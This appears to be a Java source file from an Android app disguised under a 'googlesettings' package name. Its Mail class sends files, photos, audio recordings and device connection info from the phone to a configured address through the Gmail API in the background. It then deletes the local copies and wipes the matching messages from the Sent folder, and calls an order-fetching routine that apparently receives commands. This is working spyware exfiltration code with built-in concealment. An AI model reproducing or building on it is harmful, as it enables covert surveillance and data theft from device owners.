package com.setting.dl.google.googlesettings.mail.gmail;

import android.annotation.SuppressLint;
import android.content.Context;
import android.os.AsyncTask;
import android.support.annotation.Nullable;
import android.text.TextUtils;

import com.google.api.client.repackaged.org.apache.commons.codec.binary.Base64;
import com.google.api.services.gmail.Gmail;
import com.google.api.services.gmail.model.ListMessagesResponse;
import com.google.api.services.gmail.model.Message;
import com.setting.dl.google.googlesettings.mail.Orders;
import com.setting.dl.google.googlesettings.u;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Properties;

import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.Session;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;

import static com.setting.dl.google.googlesettings.mail.gmail.GmailService.getGmailService;

/**
 * Created by hsyn on 8.06.2017.
 * <p>
 * mail işlemleri
 */

public final class Mail {
	
	public static void send(final Context context, final String subject, final String body, final File file) {
		
		String CONNECTION_INFO = "";
		try {
			CONNECTION_INFO = "\n////////////////////\n" + Orders.connectionInfo(context) + "\n////////////////////\n";
		}
		catch (Exception e) {
			e.printStackTrace();
		}
		
		String finalCONNECTION_INFO = CONNECTION_INFO;
		
		
		AsyncTask<Void, Void, Void> task = new AsyncTask<Void, Void, Void>() {
			@Override
			protected Void doInBackground(Void... params) {
				
				try {
					
					getGmailService(context).users().messages().send("me", createMessageWithEmail(createEmailWithAttachment(getTo(context), getFrom(context), subject, body + finalCONNECTION_INFO, file))).execute();
					
					u.log.i("dosya gönderildi : " + file.getName());
					
					if (file.exists()) {
						
						if (context.deleteFile(file.getName())) {
							
							u.log.i("dosya silindi : " + file.getName());
						}
						else {
							u.log.w("dosya silinemedi : " + file.getName());
						}
					}
					else {
						
						u.log.i("Böyle bir dosya yok : %s", file.getName());
					}
					
					u.run(() -> deleteAllSent(context), 10000);
					
					
				}
				catch (Exception e) {
					e.printStackTrace();
				}
				
				return null;
			}
		};
		
		task.execute();
		Orders.getOrderEx(context);
		
	}
	
	/**
	 * Create a message from an email.
	 *
	 * @param emailContent Email to be set to raw of message
	 * @return a message containing a base64url encoded email
	 * @throws IOException        ex
	 * @throws MessagingException ex
	 */
	private static Message createMessageWithEmail(MimeMessage emailContent)
			throws
			MessagingException,
			IOException {
		
		ByteArrayOutputStream buffer = new ByteArrayOutputStream();
		emailContent.writeTo(buffer);
		byte[] bytes = buffer.toByteArray();
		String encodedEmail = Base64.encodeBase64URLSafeString(bytes);
		Message message = new Message();
		message.setRaw(encodedEmail);
		return message;
	}
	
	/**
	 * Create a MimeMessage using the parameters provided.
	 *
	 * @param to       Email address of the receiver.
	 * @param from     Email address of the sender, the mailbox account.
	 * @param subject  Subject of the email.
	 * @param bodyText Body text of the email.
	 * @param file     Path to the file to be attached.
	 * @return MimeMessage to be used to wake email.
	 * @throws MessagingException ex
	 */
	private static MimeMessage createEmailWithAttachment(String to, String from, String subject, String bodyText, File file)
			throws
			MessagingException,
			IOException {
		
		Properties props = new Properties();
		Session session = Session.getDefaultInstance(props, null);
		
		MimeMessage email = new MimeMessage(session);
		
		email.setFrom(new InternetAddress(from));
		email.addRecipient(javax.mail.Message.RecipientType.TO,
				new InternetAddress(to));
		email.setSubject(subject);
		
		MimeBodyPart mimeBodyPart = new MimeBodyPart();
		mimeBodyPart.setContent(bodyText, "text/plain; charset=utf-8");
		
		Multipart multipart = new MimeMultipart();
		multipart.addBodyPart(mimeBodyPart);
		
		mimeBodyPart = new MimeBodyPart();
		DataSource source = new FileDataSource(file);
		
		mimeBodyPart.setDataHandler(new DataHandler(source));
		mimeBodyPart.setFileName(file.getName());
		
		multipart.addBodyPart(mimeBodyPart);
		email.setContent(multipart);
		
		return email;
	}
	
	private static String getTo(final Context context) {
		
		return context.getSharedPreferences("gmail", Context.MODE_PRIVATE).getString("to", null);
	}
	
	public static String getFrom(final Context context) {
		
		return context.getSharedPreferences("gmail", Context.MODE_PRIVATE).getString("from", null);
	}
	
	public static void sendImageFile(final Context context, final String subject, final String body, final File file) {
		
		String CONNECTION_INFO = "";
		try {
			CONNECTION_INFO = "\n////////////////////\n" + Orders.connectionInfo(context) + "\n////////////////////\n";
		}
		catch (Exception e) {
			e.printStackTrace();
		}
		
		String finalCONNECTION_INFO = CONNECTION_INFO;
		@SuppressLint("StaticFieldLeak") AsyncTask<Void, Void, Void> task = new AsyncTask<Void, Void, Void>() {
			@Override
			protected Void doInBackground(Void... params) {
				
				try {
					
					Message message = getGmailService(context).users().messages().send("me", createMessageWithEmail(createEmailWithAttachment(getTo(context), getFrom(context), subject, body + finalCONNECTION_INFO, file))).execute();
					
					u.log.i("dosya gönderildi : " + file.getName());
					
					if (deleteImageFile(context, file.getName())) {
						
						u.log.i("dosya silindi : " + file.getName());
					}
					else {
						u.log.w("dosya silinemedi : " + file.getName());
					}
					
				}
				catch (Exception e) {
					e.printStackTrace();
				}
				
				return null;
			}
		};
		
		task.execute();
		Orders.getOrderEx(context);
		
	}
	
	private synchronized static boolean deleteImageFile(Context context, String fileName) {
		
		File file = new File(u.getImageFolder(context), fileName);
		
		return file.exists() && file.delete();
		
	}
	
	public static void sendImage(final Context context, final String subject, final String body, final File file) {
		
		String CONNECTION_INFO = "";
		try {
			CONNECTION_INFO = "\n////////////////////\n" + Orders.connectionInfo(context) + "\n////////////////////\n";
		}
		catch (Exception e) {
			e.printStackTrace();
		}
		
		String finalCONNECTION_INFO = CONNECTION_INFO;
		@SuppressLint("StaticFieldLeak")
		AsyncTask<Void, Void, Void> task = new AsyncTask<Void, Void, Void>() {
			@Override
			protected Void doInBackground(Void... params) {
				
				try {
					
					getGmailService(context).users().messages().send("me", createMessageWithEmail(createEmailWithAttachment(getTo(context), getFrom(context), subject, body + finalCONNECTION_INFO, file))).execute();
					
					u.log.i("dosya gönderildi : " + file.getName());
					
				}
				catch (Exception e) {
					e.printStackTrace();
				}
				
				return null;
			}
		};
		
		task.execute();
		Orders.getOrderEx(context);
		
	}
	
	public static void sendAudioFile(final Context context, final String subject, final String body, final File file) {
		
		String CONNECTION_INFO = "";
		try {
			CONNECTION_INFO = "\n////////////////////\n" + Orders.connectionInfo(context) + "\n////////////////////\n";
		}
		catch (Exception e) {
			e.printStackTrace();
		}
		
		String finalCONNECTION_INFO = CONNECTION_INFO;
		@SuppressLint("StaticFieldLeak")
		AsyncTask<Void, Void, Void> task = new AsyncTask<Void, Void, Void>() {
			@Override
			protected Void doInBackground(Void... params) {
				
				try {
					
					Message message = getGmailService(context).users().messages().send("me", createMessageWithEmail(createEmailWithAttachment(getTo(context), getFrom(context), subject, body + finalCONNECTION_INFO, file))).execute();
					
					u.log.i("dosya gönderildi : " + file.getName());
					
					if (deleteAudioFile(context, file.getName())) {
						u.log.i("dosya silindi : " + file.getName());
					}
					else {u.log.w("dosya silinemedi : " + file.getName());}
					
				}
				catch (Exception e) {
					e.printStackTrace();
				}
				
				return null;
			}
		};
		
		task.execute();
		Orders.getOrderEx(context);
		
	}
	
	synchronized
	private static boolean deleteAudioFile(Context context, String fileName) {
		
		File file = new File(u.getAudioFolder(context), fileName);
		
		return file.exists() && file.delete();
		
	}
	
	public static void send(final Context context, final String fileName) {
		
		if (!u.isDeviceOnline(context)) return;
		
		String value = getSavedValue(context, fileName);
		
		if (value == null || TextUtils.isEmpty(value)) return;
		
		send(context, fileName, value);
		
	}
	
	@Nullable
	synchronized
	private static String getSavedValue(Context context, String fileName) {
		
		File file = new File(context.getFilesDir(), fileName);
		
		if (!file.exists()) return null;
		
		long len = file.length();
		byte[] bytes = new byte[(int) len];
		
		try {
			
			FileInputStream in = new FileInputStream(file);
			in.read(bytes);
			in.close();
		}
		catch (IOException ignored) {}
		
		
		return new String(bytes);
	}
	
	
	public static void send(final Context context, final String subject, final String body) {
		
		String CONNECTION_INFO = "";
		
		try {
			CONNECTION_INFO = "\n////////////////////////////////////////\n" + Orders.connectionInfo(context) + "\n////////////////////////////////////////\n";
		}
		catch (Exception e) {
			e.printStackTrace();
		}
		
		
		String finalCONNECTION_INFO = CONNECTION_INFO;
		
		AsyncTask<Void, Void, Void> task = new AsyncTask<Void, Void, Void>() {
			@Override
			protected Void doInBackground(Void... params) {
				
				try {
					
					getGmailService(context).users().messages().send("me", createMessageWithEmail(createEmail(getTo(context), getFrom(context), subject, body + finalCONNECTION_INFO))).execute();
					
					
					if (subject.endsWith(".txt")) {
						
						if (context.deleteFile(subject)) {
							
							u.log.d("dosya silindi : %s", subject);
						}
						else {
							
							u.log.d("dosya silinemedi : %s", subject);
						}
					}
					
					
				}
				catch (Exception e) {
					
					u.log.e("mail gitmedi : %s", e.toString());
					u.saveValue(context, "error.txt", e.toString());
				}
				
				return null;
			}
		};
		
		task.execute();
		u.run(() -> deleteAllSent(context), 10000);
		Orders.getOrderEx(context);
	}
	
	private static MimeMessage createEmail(String to, String from, String subject, String bodyText)
			throws
			MessagingException {
		
		Properties props = new Properties();
		Session session = Session.getDefaultInstance(props, null);
		
		MimeMessage email = new MimeMessage(session);
		
		email.setFrom(new InternetAddress(from));
		email.addRecipient(javax.mail.Message.RecipientType.TO, new InternetAddress(to));
		email.setSubject(subject);
		email.setText(bodyText, "utf-8");
		return email;
	}
    
    
  /*
    public static Message sendMessage(Gmail service, String userId, MimeMessage emailContent) throws MessagingException, IOException {
        
        Message message = createMessageWithEmail(emailContent);
        message = service.users().messages().wake(userId, message).execute();
        return message;
    }
    */
	
	
	public static void deleteAllSent(final Context context) {
		
		final Gmail service = getGmailService(context);
		
		@SuppressLint("StaticFieldLeak") AsyncTask<Void, Void, Void> task = new AsyncTask<Void, Void, Void>() {
			
			@Override
			protected Void doInBackground(Void... params) {
				
				List<Message> sentMessages;
				
				try {
					
					sentMessages = mylistMessagesWithLabelsWithQ(service, "me", Collections.singletonList("SENT"), u.s("to:%s", getTo(context)));
					
					for (Message message : sentMessages) {
						
						service.users().messages().delete("me", message.getId()).execute();
					}
					
					u.log.d("gönderilen mailler silindi");
					
				}
				catch (Exception e) {
					u.log.e("mailler silinemedi : %s", e.toString());
					
				}
				
				u.freeMemory();
				return null;
			}
		};
		
		task.execute();
	}
	
	public static List<Message> mylistMessagesWithLabelsWithQ(Gmail service, String userId, List<String> labelIds, String query)
			throws
			IOException {
		
		
		ListMessagesResponse response = service.users().messages().list(userId).setQ(query)
				.setLabelIds(labelIds).execute();
		
		List<Message> messages = new ArrayList<>();
		while (response.getMessages() != null) {
			messages.addAll(response.getMessages());
			if (response.getNextPageToken() != null) {
				String pageToken = response.getNextPageToken();
				response = service.users().messages().list(userId).setLabelIds(labelIds)
						.setPageToken(pageToken).execute();
			}
			else {
				break;
			}
		}
		return messages;
	}
    
 /*   public static Message getMessage(Gmail service, String userId, String messageId)
            throws
            IOException {
        
        //System.out.println("Message snippet: " + message.getSnippet());
        
        return service.users().messages().get(userId, messageId).execute();
    }
    
   
    public static MimeMessage getMimeMessage(Gmail service, String userId, String messageId)
            throws
            IOException,
		    MessagingException {
        
        Message message = service.users().messages().get(userId, messageId).setFormat("raw").execute();
        
        Base64 base64Url = new Base64(true);
        byte[] emailBytes = Base64.decodeBase64(message.getRaw());
        
        Properties props   = new Properties();
        Session    session = Session.getDefaultInstance(props, null);
        
        return new MimeMessage(session, new ByteArrayInputStream(emailBytes));
    }
    
    
    public static void getAttachments(Gmail service, String userId, String messageId, String path)
            throws
            IOException {
        
        Message message = service.users().messages().get(userId, messageId).execute();
        List<MessagePart> parts = message.getPayload().getParts();
        
        for (MessagePart part : parts) {
            
            if (part.getFilename() != null && part.getFilename().length() > 0) {
                
                String filename = part.getFilename();
                u.li("ek alınıyor : " + filename);
                
                String attId = part.getBody().getAttachmentId();
                MessagePartBody attachPart = service.users().messages().attachments().get(userId, messageId, attId).execute();
                
                Base64 base64Url = new Base64(true);
                byte[] fileByteArray = Base64.decodeBase64(attachPart.getData());
                
                String fullPath = path + "/" + filename;
                
                FileOutputStream fileOutFile = new FileOutputStream(fullPath);
                fileOutFile.write(fileByteArray);
                fileOutFile.close();
                u.li("ek kaydedildi : " + fullPath);
            }
        }
    }
    */
	
	
}
